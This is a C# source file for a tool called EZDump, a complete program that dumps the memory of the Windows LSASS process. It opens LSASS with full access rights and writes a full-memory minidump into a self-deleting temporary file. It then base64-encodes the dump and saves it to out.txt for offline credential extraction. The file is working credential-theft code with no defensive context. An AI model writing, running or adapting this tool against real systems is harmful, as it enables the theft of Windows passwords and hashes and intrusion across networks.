using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Microsoft.Win32.SafeHandles;

namespace EZDump
{
    class Program
    {
        // Import required functions from external DLLs

        // This function is used to write a mini dump of the lsass process
        [DllImport("dbghelp.dll", SetLastError = true)]
        internal static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeFileHandle hFile, uint dumpType,
            IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        // This function is used to obtain a handle to the lsass process
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        static void Main()
        {
            // Obtain the Process ID of the LSASS process
            Process lsass = Process.GetProcessesByName("lsass")[0];
            int targetProcessId = lsass.Id;

            // Obtain a handle to the LSASS process
            IntPtr targetProcessHandle = OpenProcess(0x001F0FFF, false, targetProcessId);

            try
            {
                // Create a temporary file to store the minidump
                string tempFilePath = Path.GetTempFileName();

                // Open the temporary file with a FileStream, which will automatically delete the file when it is closed
                using (FileStream tempStream = new FileStream(tempFilePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None, 4096, FileOptions.DeleteOnClose))
                {
                    // Write the minidump to the temporary FileStream
                    if (MiniDumpWriteDump(targetProcessHandle, (uint)targetProcessId, tempStream.SafeFileHandle, 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
                    {
                        // Read the temporary FileStream into a byte array
                        tempStream.Position = 0;
                        byte[] byteArray = new byte[tempStream.Length];
                        tempStream.Read(byteArray, 0, (int)tempStream.Length);

                        // Convert the byte array to a base64 string and write it to a file
                        string base64String = Convert.ToBase64String(byteArray);
                        File.WriteAllText("out.txt", base64String);
                        Console.WriteLine("[+] Dump succeeded");
                    }
                    else
                    {
                        // If the minidump operation failed, print an error message and the last Win32 error code
                        Console.WriteLine("[-] Dump failed");
                        Console.WriteLine(Marshal.GetLastWin32Error());
                    }
                }
            }
            catch (Exception e)
            {
                // If an exception occurred during the operation, print an error message and the exception details
                Console.WriteLine("[-] Exception dumping process memory");
                Console.WriteLine($"\n[-] {e.Message}\n{e.StackTrace}");
            }
        }
    }
}
